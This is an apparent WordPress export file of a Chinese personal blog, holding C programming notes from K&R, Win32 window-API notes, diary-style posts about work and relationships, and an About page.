<?xml version="1.0" encoding="UTF-8"?>
<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your blog. -->
<!-- It contains information about your blog's posts, comments, and categories. -->
<!-- You may use this file to transfer that content from one site to another. -->
<!-- This file is not intended to serve as a complete backup of your blog. -->

<!-- To import this information into a WordPress blog follow these steps. -->
<!-- 1. Log in to that blog as an administrator. -->
<!-- 2. Go to Tools: Import in the blog's admin panels (or Manage: Import in older versions of WordPress). -->
<!-- 3. Choose "WordPress" from the list. -->
<!-- 4. Upload this file using the form provided on that page. -->
<!-- 5. You will first be asked to map the authors in this export file to users -->
<!--    on the blog.  For each author, you may choose to map to an -->
<!--    existing user on the blog or to create a new user -->
<!-- 6. WordPress will then import each of the posts, comments, and categories -->
<!--    contained in this file into your blog -->

<!-- generator="WordPress/3.0" created="2013-06-23 15:11"-->
<rss version="2.0"
	xmlns:excerpt="http://wordpress.org/export/1.0/excerpt/"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:wp="http://wordpress.org/export/1.0/"
>

<channel>
	<title>CODEMYLIFE的部落格</title>
	<link>http://codemylife.blogcn.com</link>
	<description>我颠倒了整个世界，只为摆正你的倒影。</description>
	<pubDate>Sat, 06 Apr 2013 12:39:38 +0000</pubDate>
	<generator>http://wordpress.org/?v=3.0</generator>
	<language>en</language>
	<wp:wxr_version>1.0</wp:wxr_version>
	<wp:base_site_url>http://codemylife.blogcn.com</wp:base_site_url>
	<wp:base_blog_url>http://codemylife.blogcn.com</wp:base_blog_url>
		<wp:category><wp:category_nicename>%e5%b7%a5%e5%85%b7</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[工具]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>%e6%8a%80%e6%9c%af</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[技术]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>%e6%9c%aa%e5%88%86%e7%b1%bb</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[未分类]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>%e6%9d%82%e8%ae%b0</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[杂记]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>%e6%b8%b8%e6%88%8f%e5%bc%80%e5%8f%91</wp:category_nicename><wp:category_parent>技术</wp:category_parent><wp:cat_name><![CDATA[游戏开发]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>%e7%94%9f%e6%b4%bb</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[生活]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>%e8%af%bb%e4%b9%a6</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[读书]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>%e9%9a%8f%e7%ac%94</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[随笔]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>cc</wp:category_nicename><wp:category_parent>技术</wp:category_parent><wp:cat_name><![CDATA[C/C++]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>c%e7%a8%8b%e5%ba%8f%e8%ae%be%e8%ae%a1%e8%af%ad%e8%a8%80</wp:category_nicename><wp:category_parent>读书</wp:category_parent><wp:cat_name><![CDATA[C程序设计语言]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>directx</wp:category_nicename><wp:category_parent>技术</wp:category_parent><wp:cat_name><![CDATA[DirectX]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>mfc</wp:category_nicename><wp:category_parent>技术</wp:category_parent><wp:cat_name><![CDATA[MFC]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>windows</wp:category_nicename><wp:category_parent>技术</wp:category_parent><wp:cat_name><![CDATA[Windows]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>tricks-of-the-windows-game-progrmming</wp:category_nicename><wp:category_parent>读书</wp:category_parent><wp:cat_name><![CDATA[Windows 游戏编程大师技巧]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80</wp:category_nicename><wp:category_parent>读书</wp:category_parent><wp:cat_name><![CDATA[汇编语言]]></wp:cat_name></wp:category>
		<wp:category><wp:category_nicename>%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%9b%be%e5%bd%a2%e5%ad%a6%e5%af%bc%e8%ae%ba</wp:category_nicename><wp:category_parent>读书</wp:category_parent><wp:cat_name><![CDATA[计算机图形学导论]]></wp:cat_name></wp:category>
			<wp:tag><wp:tag_slug>c</wp:tag_slug><wp:tag_name><![CDATA[C]]></wp:tag_name></wp:tag>
		<wp:tag><wp:tag_slug>directdraw</wp:tag_slug><wp:tag_name><![CDATA[DirectDraw]]></wp:tag_name></wp:tag>
		<wp:tag><wp:tag_slug>directx</wp:tag_slug><wp:tag_name><![CDATA[DirectX]]></wp:tag_name></wp:tag>
		<wp:tag><wp:tag_slug>windows</wp:tag_slug><wp:tag_name><![CDATA[Windows]]></wp:tag_name></wp:tag>
		<wp:tag><wp:tag_slug>%e5%9b%be%e5%bd%a2%e5%ad%a6</wp:tag_slug><wp:tag_name><![CDATA[图形学]]></wp:tag_name></wp:tag>
		<wp:tag><wp:tag_slug>%e5%b7%a5%e5%85%b7</wp:tag_slug><wp:tag_name><![CDATA[工具]]></wp:tag_name></wp:tag>
		<wp:tag><wp:tag_slug>%e6%b1%87%e7%bc%96</wp:tag_slug><wp:tag_name><![CDATA[汇编]]></wp:tag_name></wp:tag>
		<wp:tag><wp:tag_slug>%e6%b8%b8%e6%88%8f%e5%bc%80%e5%8f%91</wp:tag_slug><wp:tag_name><![CDATA[游戏开发]]></wp:tag_name></wp:tag>
		<wp:tag><wp:tag_slug>%e7%bc%96%e7%a0%81</wp:tag_slug><wp:tag_name><![CDATA[编码]]></wp:tag_name></wp:tag>
		<wp:tag><wp:tag_slug>%e8%af%bb%e4%b9%a6</wp:tag_slug><wp:tag_name><![CDATA[读书]]></wp:tag_name></wp:tag>
		
	<generator>http://wordpress.org/?v=3.0</generator>

		<item>
		<title>《C程序设计语言》中的程序小诗(三)</title>
		<link>http://codemylife.blogcn.com/?p=81</link>
		<pubDate>Wed, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[C程序设计语言]]></category>

		<category domain="category" nicename="c%e7%a8%8b%e5%ba%8f%e8%ae%be%e8%ae%a1%e8%af%ad%e8%a8%80"><![CDATA[C程序设计语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=81</guid>
		<description></description>
		<content:encoded><![CDATA[翠花，上代码……
<pre class="c">strindex函数：返回t在s中的位置，若未找到则返回-1
int strindex(char s[], char t[])
{
    int i, j, k;
</br>
    for (i = 0; s[i] != '\0'; i++) {
        for (j = i, k = 0; t[k] != '\0' &amp;&amp; s[j] == t[k]; j++, k++)
            ;
        if (k &gt; 0 &amp;&amp; t[k] == '\0')
            return i;
    }
    return -1;
}</pre>
continue：continue语句只用于循环语句，不用于switch语句。<strong>某个循环包含的switch语句中的continue语句，将导致进入下一次循环</strong>。

初始化：在不进行显示初始化的情况下，外部变量（全局变量）和静态变量都将初始化为0，而自动变量（栈变量）和寄存器变量的初值是没有定义。数组的初始化可以在后面跟一个初始化表达式列表。<strong>如果初始化表达式的个数比数组元素少，则对外部变量、静态变量和自动变量来说，没有初始化表达式的元素将被初始化为0</strong>。

swap函数：交换v[i]与v[j]的值
<pre class="c">void swap( int v[], int i, int j)
{
    int temp;
    temp = v[i];
    v[i] = v[j];
    v[j] = temp;
}</pre>
qsort函数：以递增顺序对v[left]……v[right]进行排序
<pre class="c">void qsort(int v[], int left, int right)
{
    int i, last;
    void swap(int v[], int i, int j);
</br>
    if (left &gt;= right)
        return;
    swap(v, left, (left + right) / 2); /* 将划分子集的元素 */
    last = left;                       /* 移动到v[0] */
    for (i = left + 1; i &lt;= right; i++)/* 划分子集 */
        if (v[i] &lt; v[left])
            swap(v, ++last, i);
    swap(v, left, last);               /* 恢复划分子集的元素 */
    qsort(v, left, last - 1);
    qsort(v last + 1, right);
}</pre>
例子：1 9 2 8 6 -&gt; 2 9 1 8 6 -&gt; 2 1 9 8 6 -&gt; 1 2 9 8 6

头文件定义：
<ol>
	<li>对类型的声明(declaration)</li>
	<li>函数声明。特别说明，函数的定义(implementation)是不放在头文件中的，是放在函数库中或单独编译成目标文件的，在编译连接阶段与用户文件链接组成可执行文件</li>
	<li>内置（inline）函数的定义。由于内置函数的代码是要插入用户程序中的，因此它应当与调用它的语句放在同一文件中</li>
	<li>宏定义</li>
	<li>全局变量定义</li>
	<li>外部变量声明</li>
	<li>还可以根据需要包含其他头文件</li>
</ol>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>81</wp:post_id>
		<wp:post_date>2011-09-11 09:59:07</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1316167148]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>汇编语言笔记——标志寄存器</title>
		<link>http://codemylife.blogcn.com/?p=106</link>
		<pubDate>Wed, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[未分类]]></category>

		<category domain="category" nicename="%e6%9c%aa%e5%88%86%e7%b1%bb"><![CDATA[未分类]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=106</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>106</wp:post_id>
		<wp:post_date>2011-09-27 11:51:08</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e6%a0%87%e5%bf%97%e5%af%84%e5%ad%98%e5%99%a8</wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1317095468]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>自动草稿</title>
		<link>http://codemylife.blogcn.com/?p=183</link>
		<pubDate>Wed, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=183</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>183</wp:post_id>
		<wp:post_date>2013-06-23 23:10:59</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>auto-draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
							</item>
		<item>
		<title>生活</title>
		<link>http://codemylife.blogcn.com/?page_id=176</link>
		<pubDate>Wed, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://codemylife.blogcn.com/</guid>
		<description></description>
		<content:encoded><![CDATA[我zuiqinai《我最亲爱的》]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>176</wp:post_id>
		<wp:post_date>2012-10-02 21:14:53</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>page</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1349183693]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>关于</title>
		<link>http://codemylife.blogcn.com/about/</link>
		<pubDate>Sun, 27 Mar 2011 16:24:19 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://codemylife.blogcn.com/?page_id=2</guid>
		<description></description>
		<content:encoded><![CDATA[80后男生
小小的程序员
怀着心中大大的梦
努力奔向自己的未来
mail：houapple@163.com]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2</wp:post_id>
		<wp:post_date>2011-03-27 16:24:19</wp:post_date>
		<wp:post_date_gmt>2011-03-27 16:24:19</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>about</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>page</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1306155272]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_page_template</wp:meta_key>
		<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[25]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>新的开始</title>
		<link>http://codemylife.blogcn.com/2011/03/%e6%96%b0%e7%9a%84%e5%bc%80%e5%a7%8b/</link>
		<pubDate>Tue, 29 Mar 2011 02:39:19 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[随笔]]></category>

		<category domain="category" nicename="%e9%9a%8f%e7%ac%94"><![CDATA[随笔]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=6</guid>
		<description></description>
		<content:encoded><![CDATA[开始迁移自己在网易博客上的文章，希望是一个新的开始。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>6</wp:post_id>
		<wp:post_date>2011-03-29 10:39:19</wp:post_date>
		<wp:post_date_gmt>2011-03-29 02:39:19</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%96%b0%e7%9a%84%e5%bc%80%e5%a7%8b</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1301366366]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[19]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>雨的印记</title>
		<link>http://codemylife.blogcn.com/2011/03/%e9%9b%a8%e7%9a%84%e5%8d%b0%e8%ae%b0/</link>
		<pubDate>Tue, 29 Mar 2011 03:07:46 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[随笔]]></category>

		<category domain="category" nicename="%e9%9a%8f%e7%ac%94"><![CDATA[随笔]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=10</guid>
		<description></description>
		<content:encoded><![CDATA[周六晚，一个人，洗澡洗衣服，躺在床上。

电脑里传来了雨的印记，让我想起了很多零碎的事，想写下来。

还记得第一次听《雨的印记》，那是在一个人的博客里，博客里记录着一些事，当时听着这音乐立即沉浸在其中了，看着博客，听着音乐，很忧伤......

最近一个月似乎人都堕落了，或许没有那么严重，只是下班后没怎么学习了。这段时间想看书却看不进去，想写代码也没有动力，想起来过的实在是很不充实。当初买小黑（thinkpad）的时候，心里多雄心壮志要写多少代码，却没能做到，总是有各种不完美的事情让我缺乏动力，比如想找一个稳定的，代码高亮的博客；比如还没去买床上的电脑桌，侧在床头柜上脖子很酸。
在选博客这个问题上纠结了好久，看了好些的博客网站，一直未能如心意！不是代码高亮不好，或者网速卡，或者担心网站的生命期。后来决定的，就安在这里了，自己的邮箱也是用的这个。虽然代码没高亮也就算了，毕竟人生不是炒菜，不能把什么东西都准备好了才下锅！

说说自己的工作......
2010.7.16，一个人从成都双流坐飞机到上海，然后和其他同学一起住职达，培训，进项目组。一住就住了将近四个月，后来搬到松江。在这期间大多数周末都一个人呆在旅馆，每天很晚的起床，吃饭，然后看在书店买来的书。上班的时候看代码，写代码 。代码大都是与上层应用相关，比如角色数据，物品，GUI界面，消息等等，觉得自己不能老看上层的代码了，花了很大的精力看懂了了内存分配相关的，可也就止步于此了，还有很多的底层，没看进去。人物的动画，魔法也还未涉及。

说说自己的感情.......
工作开始了，感情也不稳定了，其实之前就和女朋友吵了很多架了，很想好好的和她走下去，却很无力!不清楚，为什么经历多年的感情，我的恋爱可能却未成及格，或许这需要用一生来学习......

元旦过了，阳历新的一年也开始了，我开始在这里记录自己的工作、学习、生活。希望有一个好的开始！

希望家里一切都好！
希望自己在工作上学习更多的知识，我会努力！
希望和女友能很好的走下去！]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>10</wp:post_id>
		<wp:post_date>2011-03-29 11:07:46</wp:post_date>
		<wp:post_date_gmt>2011-03-29 03:07:46</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e9%9b%a8%e7%9a%84%e5%8d%b0%e8%ae%b0</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[8]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1301887059]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>Windows窗口显示</title>
		<link>http://codemylife.blogcn.com/2011/03/windows%e7%aa%97%e5%8f%a3%e6%98%be%e7%a4%ba/</link>
		<pubDate>Tue, 29 Mar 2011 03:18:58 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[Windows]]></category>

		<category domain="category" nicename="windows"><![CDATA[Windows]]></category>

		<category domain="tag"><![CDATA[Windows]]></category>

		<category domain="tag" nicename="windows"><![CDATA[Windows]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=12</guid>
		<description></description>
		<content:encoded><![CDATA[最近在看《Windows程序设计》，记录一下笔记，方便以后查阅。

<strong>窗口</strong>：一个窗口就是屏幕上的一个矩形区域，它接受用户的输入，并以文本或图形的格式显示输出内容。窗口也是一个种对象，每一个窗口都有相关的窗口过程，窗口过程是一个函数（可能在当前程序中也可能在动态链接库中），Windows通过调用窗口过程来给窗口发送消息，窗口过程根据此消息进行处理，然后将控制返回Windows。
创建一个窗口：CreateWindow或CreateWindowEx
MSDN：CreateWindow is implemented as a macro. It is defined as CreateWindowEx, but with the dwExStyle parameter set to 0L.
窗口相关函数

<strong>RegisterClass</strong>：ATOM RegisterClass( CONST WNDCLASS *lpWndClass);
参数
lpWndClass：指向WNDCLASS结构的指针
返回值:调用成功，返回值是一个class atom唯一标识。调用失败，返回0值。

<strong>ShowWindow</strong>：BOOL ShowWindow( HWND hWnd,  int nCmdShow);
参数
hWnd：窗口句柄
nCmdShow：用于设置窗口如何显示。
返回值：如果窗口之前是可见的，返回值非0，否则，返回0。
附注：应用程序第一次调用此函数，使用WinMain函数中的nCmdShow做参数。在窗口显示和隐藏时，要表现特殊的特效，使用AnimateWindow。

<strong>UpdateWindow</strong>：BOOL UpdateWindow(HWND hWnd);
参数
hWnd ：窗口句柄
返回值：调用成功，返回值非0，否则，返回0。
附注：如果窗口的更新区域（update region）非空，那么此函数想窗口发送一个WM_PAINT消息来更新客户区。此WM_PAINT消息直接直接发给窗口过程，不经过应用程序消息队列。如果更新区域为空，不发送消息。

<strong>GetMessage</strong>：BOOL GetMessage(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
参数
lpMsg：指向从线程消息队列里接受到的消息结构体的指针
hWnd：正在取消息的窗口句柄，此窗口必须属于调用线程。若为NULL，GetMessage检索属于调用线程的所有窗口消息和使用PostThreadMessage发送给调用线程的线程消息
wMsgFilterMin，wMsgFilterMax：被检索消息值的范围。若这两个的值均为0，则GetMessage返回所有可用的消息。
返回值：取回一个消息（除WM_QUIT），返回值非0，取回的消息为WM_QUIT，返回0。调用失败，返回-1。
附注：应用程序仅使用wMsgFilterMin、wMsgFilterMax的低字节，高字节系统保留。GetMessage总是能取到WM_QUIT消息（无视消息值范围）。GetMessage不会从消息队列里移掉WM_PAINT消息，此消息停留在消息队列里直到被处理。

<strong>TranslateMessage</strong>：BOOL TranslateMessage(const MSG *lpMsg);
说明：TranslateMessage翻译虚拟键消息为字符消息，并将字符消息发送给应用程序的消息队列。
参数
lpMsg：指向MSG结构体
返回值：消息翻译成功，返回值非0。若消息为WM_KEYDOWN，WM_KEYUP， WM_SYSKEYDOWN， 或 WM_SYSKEYUP，不管翻译结果，返回值非0。消息没有被翻译，返回值为0。
附注：TranslateMessage不会修改传入的消息。若键盘驱动程序有键和ASCII字符的映射，TranslateMessage产生WM_CHAR消息。若TranslateAccelerator函数返回非0值，则应用程序不应调用TranslateMessage。

<strong>DispatchMessage</strong>：LRESULT DispatchMessage(const MSG *lpmsg);
说明：DispatchMessage分派消息到窗口过程。
参数
lpmsg：指向MSG消息结构体
返回值：返回值为窗口过程的返回值，通常忽略。
附注：MSG结构体必须包含有效的消息值。若lpmsg参数指向WM_TIMER消息，且WM_TIMER消息的lParam参数不为NULL，则调用lParam所指的函数而非窗口过程。

<strong>BeginPaint</strong>：HDC BeginPaint(HWND hwnd, LPPAINTSTRUCT lpPaint);
说明：BeginPaint为特定窗口的绘制做准备，并填充PAINTSTRUCT结构体。
参数
hwnd：需要被重绘的窗口句柄
lpPaint：指向将接受绘制信息的PAINTSTRUCT结构体
返回值：调用成功，返回值为指定窗口的设备上下文的句柄；调用失败，返回值为NULL，标志无显示设备上下文可用。
附注：BeginPaint函数自动设置设备上下文的裁剪区域为包含更新区域外的任何区域。更新区域由InvalidateRect 或 InvalidateRgn设置。也由系统设置比如改变大小 ，创建，移动，滚动，或者其他影响客户区的操作。若更新区设置了被擦除，BeginPaint发送WM_ERASEBKGND消息给窗口。
应用程序只应在响应WM_PAINT消息期间调用BeginPaint，并以调用EndPaint结束。若插入符所在的区域将被绘制，BeginPaint自动隐藏插入符从而防止被擦除。若窗口类有背景画刷，那么BeginPaint函数在返回前用背景画刷擦除更新区背景。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>12</wp:post_id>
		<wp:post_date>2011-03-29 11:18:58</wp:post_date>
		<wp:post_date_gmt>2011-03-29 03:18:58</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>windows%e7%aa%97%e5%8f%a3%e6%98%be%e7%a4%ba</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359235]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
